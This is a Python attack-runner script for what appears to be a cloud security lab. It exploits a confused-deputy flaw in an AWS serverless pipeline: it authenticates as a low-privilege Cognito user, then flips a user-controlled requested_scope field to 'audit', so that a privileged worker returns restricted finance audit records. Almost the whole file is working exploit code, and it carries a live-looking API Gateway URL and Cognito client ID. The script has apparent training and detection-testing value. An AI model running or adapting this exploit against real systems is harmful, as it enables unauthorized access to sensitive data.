#!/usr/bin/env python3
"""
Scenario 4 (Serverless Identity Pivot / Confused Deputy) attack runner.

Replays the kill chain documented in
"Scenario 3 - Serverless Identity Pivot and Confused Deputy Attack.pdf"
(the PDF is titled "Scenario 3" but this is the 4th lab scenario).

The target is a serverless report pipeline:

    Cognito user (viewer1)
        -> API Gateway  (JWT authorizer)
        -> ReportApi Lambda        (PUBLIC, trusts client input)
        -> SQS  Scenario3-ReportQueue
        -> AuditWorker Lambda       (PRIVATE, in VPC, over-privileged)
        -> STS AssumeRole FinanceAuditReadRole
        -> Secrets Manager  Scenario3/FinanceAuditRdsReader
        -> RDS finance_lab.audit_records
        -> DynamoDB Scenario3-ReportJobs   (result stored)
        -> GET /jobs/{jobId}               (result read back)

The vulnerability is a confused deputy: the request body carries a
user-controlled field `requested_scope`. A low-privilege front-end user is
only supposed to get "standard" (sanitized / empty) reports, but the backend
AuditWorker *trusts* that field. Sending `requested_scope=audit` makes the
privileged worker assume a sensitive IAM role, pull DB credentials from
Secrets Manager, and return restricted audit records -- with no attack on the
infrastructure itself, only a flipped JSON value.

The attacker never needs AWS credentials. Cognito USER_PASSWORD_AUTH is an
UNauthenticated public API, so authentication is done with a raw HTTPS call to
the Cognito IDP endpoint (no aws-cli, no ~/.aws profile). Everything after that
is plain HTTP against the public API Gateway URL. This runs cleanly from an
attacker VM that has never been configured with AWS access.

Phases (matching the PDF's "Verify" checklist):
  0  auth          authenticate viewer1 -> Cognito ACCESS_TOKEN
  1  unauth        POST /jobs with no token             -> expect 401
  2  standard      POST /jobs requested_scope=standard  -> expect empty records
  3  audit         POST /jobs requested_scope=audit     -> EXPECT restricted
                   audit records  (the confused-deputy exploit)

Standard library only. Transcribed from the PDF; verify the first run against
the live API and Wazuh/CloudTrail.

Usage:
    export COGNITO_LAB_PASSWORD='<viewer1 password>'
    python3 scenario4_attack_runner.py                 # run all phases 0-3
    python3 scenario4_attack_runner.py --phase 3       # exploit only (needs token)
    python3 scenario4_attack_runner.py --list          # show phase names
    python3 scenario4_attack_runner.py --password '...' # pass password inline
    python3 scenario4_attack_runner.py --scope audit --dept finance  # custom job

Side effects: creates report jobs in DynamoDB Scenario3-ReportJobs and drives
one SQS message + AuditWorker invocation per POST. Nothing is deleted.
"""

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request

# --- Target configuration (from the PDF) -----------------------------------
API_URL = "https://whc8v11gfa.execute-api.eu-north-1.amazonaws.com"
REGION = "eu-north-1"
COGNITO_IDP = f"https://cognito-idp.{REGION}.amazonaws.com/"
COGNITO_CLIENT_ID = "7m2hap80308jea8phvom23ei13"
COGNITO_USER = "viewer1"
TIMEOUT = 30

# Cache the token between phases so `--phase 3` can reuse a fresh login.
TOKEN_CACHE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           ".scenario4_token")


def log(msg):
    print(f"[+] {msg}", flush=True)


def warn(msg):
    print(f"[!] {msg}", flush=True)


def fail(msg):
    print(f"[x] {msg}", flush=True)
    sys.exit(1)


# --- HTTP helpers -----------------------------------------------------------
def _http(method, url, headers=None, body=None):
    """Return (status_code, decoded_body_str). Never raises on HTTP errors."""
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method=method,
                                 headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except urllib.error.URLError as e:
        fail(f"connection error to {url}: {e.reason}")


def _pretty(body):
    try:
        return json.dumps(json.loads(body), indent=2)
    except Exception:
        return body


# --- Phase 0: Cognito authentication (unauthenticated public API) -----------
def cognito_login(password):
    """USER_PASSWORD_AUTH InitiateAuth over raw HTTPS. No AWS creds required."""
    payload = json.dumps({
        "AuthFlow": "USER_PASSWORD_AUTH",
        "ClientId": COGNITO_CLIENT_ID,
        "AuthParameters": {"USERNAME": COGNITO_USER, "PASSWORD": password},
    })
    headers = {
        "Content-Type": "application/x-amz-json-1.1",
        "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
    }
    status, body = _http("POST", COGNITO_IDP, headers, payload)
    if status != 200:
        fail(f"Cognito auth failed (HTTP {status}): {body}")
    result = json.loads(body).get("AuthenticationResult", {})
    token = result.get("AccessToken")
    if not token:
        # A NEW_PASSWORD_REQUIRED challenge means viewer1 is still in
        # FORCE_CHANGE_PASSWORD -- a lab setup issue, not a backend bug.
        fail(f"no AccessToken in response (challenge?): {body}")
    log(f"authenticated as {COGNITO_USER}; access token acquired "
        f"({len(token)} chars)")
    return token


def load_token(password_getter):
    """Return a cached token if fresh (<50 min), else log in and cache it."""
    if os.path.exists(TOKEN_CACHE):
        age = time.time() - os.path.getmtime(TOKEN_CACHE)
        if age < 50 * 60:
            with open(TOKEN_CACHE) as f:
                tok = f.read().strip()
            if tok:
                log(f"reusing cached token ({int(age)}s old)")
                return tok
    token = cognito_login(password_getter())
    with open(TOKEN_CACHE, "w") as f:
        f.write(token)
    os.chmod(TOKEN_CACHE, 0o600)
    return token


# --- API Gateway calls ------------------------------------------------------
def post_job(token, scope, dept):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = json.dumps({"requested_scope": scope, "target_department": dept})
    return _http("POST", f"{API_URL}/jobs", headers, body)


def get_job(token, job_id):
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    return _http("GET", f"{API_URL}/jobs/{job_id}", headers)


def _extract_job_id(body):
    try:
        j = json.loads(body)
    except Exception:
        return None
    return j.get("job_id") or j.get("jobId") or j.get("id")


def submit_and_fetch(token, scope, dept):
    """POST a job, then GET the result. Returns the result body string."""
    status, body = post_job(token, scope, dept)
    log(f"POST /jobs scope={scope!r} dept={dept!r} -> HTTP {status}")
    print(_pretty(body))
    if status >= 400:
        return None
    job_id = _extract_job_id(body)
    if not job_id:
        warn("no job_id in POST response; cannot fetch result")
        return None
    # The worker is async (SQS -> AuditWorker -> DynamoDB); poll for the result.
    log(f"job_id={job_id}; polling GET /jobs/{job_id} for the stored result")
    result = None
    for attempt in range(1, 9):
        time.sleep(2)
        gs, gb = get_job(token, job_id)
        result = gb
        if gs == 200 and _is_complete(gb):
            log(f"  attempt {attempt}: HTTP {gs}, COMPLETED, "
                f"records={_record_count(gb)}")
            break
        log(f"  attempt {attempt}: HTTP {gs} (still {_status(gb)})")
    print(_pretty(result))
    return result


def _status(body):
    try:
        return json.loads(body).get("status", "?")
    except Exception:
        return "?"


def _record_count(body):
    """Count returned records. The API nests them under
    report_result.records, so check there first, then a few top-level keys."""
    try:
        j = json.loads(body)
    except Exception:
        return None
    rr = j.get("report_result")
    if isinstance(rr, dict) and isinstance(rr.get("records"), list):
        return len(rr["records"])
    for key in ("records", "results", "rows", "items"):
        v = j.get(key)
        if isinstance(v, list):
            return len(v)
    return None


def _is_complete(body):
    """The job is done once status flips to COMPLETED (records may be empty)."""
    try:
        return json.loads(body).get("status") == "COMPLETED"
    except Exception:
        return False


# --- Phases -----------------------------------------------------------------
def phase_unauth():
    log("PHASE 1: unauthenticated access check (expect HTTP 401)")
    status, body = post_job(None, "standard", "general")
    log(f"POST /jobs (no Authorization) -> HTTP {status}")
    print(_pretty(body))
    if status == 401:
        log("GOOD: JWT authorizer correctly rejects the unauthenticated request")
    else:
        warn(f"expected 401, got {status} -- authorizer may be misconfigured")


def phase_standard(token):
    log("PHASE 2: legitimate 'standard' request (expect empty / sanitized)")
    result = submit_and_fetch(token, "standard", args.dept)
    rc = _record_count(result) if result else None
    if rc == 0:
        log("GOOD: standard scope returns no restricted records (as designed)")
    elif rc:
        warn(f"standard scope returned {rc} records -- unexpected")


def phase_audit(token):
    log("PHASE 3: EXPLOIT -- confused deputy, requested_scope='audit'")
    log("  (a low-privilege front-end user requesting the privileged scope)")
    result = submit_and_fetch(token, "audit", args.dept)
    rc = _record_count(result) if result else None
    if rc:
        log(f"EXPLOIT SUCCESS: audit scope returned {rc} restricted record(s) "
            f"to a low-privilege user -- confused deputy confirmed")
    else:
        warn("no audit records returned; the worker may already be patched, "
             "or the result is still being written (re-run --phase 3)")


PHASES = {
    "1": ("unauth", phase_unauth),
    "2": ("standard", phase_standard),
    "3": ("audit", phase_audit),
}


def main():
    global args
    parser = argparse.ArgumentParser(
        description="Scenario 4 serverless confused-deputy attack runner")
    parser.add_argument("--phase", choices=["1", "2", "3"],
                        help="run only one phase (0/auth always runs first)")
    parser.add_argument("--password", help="viewer1 password "
                        "(else $COGNITO_LAB_PASSWORD)")
    parser.add_argument("--scope", help="override requested_scope for a single "
                        "custom POST /jobs, then exit")
    parser.add_argument("--dept", default="general",
                        help="target_department (default: general)")
    parser.add_argument("--list", action="store_true",
                        help="list phases and exit")
    args = parser.parse_args()

    if args.list:
        print("Phases:")
        print("  0  auth      Cognito login (always runs first)")
        for k, (name, _) in PHASES.items():
            print(f"  {k}  {name}")
        return

    def get_password():
        pw = args.password or os.environ.get("COGNITO_LAB_PASSWORD")
        if not pw:
            fail("no password: set COGNITO_LAB_PASSWORD or pass --password")
        return pw

    # Phase 1 (unauth) needs no token; everything else does.
    if args.phase == "1":
        phase_unauth()
        return

    token = load_token(get_password)

    if args.scope:  # ad-hoc single request
        submit_and_fetch(token, args.scope, args.dept)
        return

    if args.phase:
        name, fn = PHASES[args.phase]
        fn() if args.phase == "1" else fn(token)
        return

    # Full run: unauth -> standard -> audit
    phase_unauth()
    print("-" * 70)
    phase_standard(token)
    print("-" * 70)
    phase_audit(token)


if __name__ == "__main__":
    main()
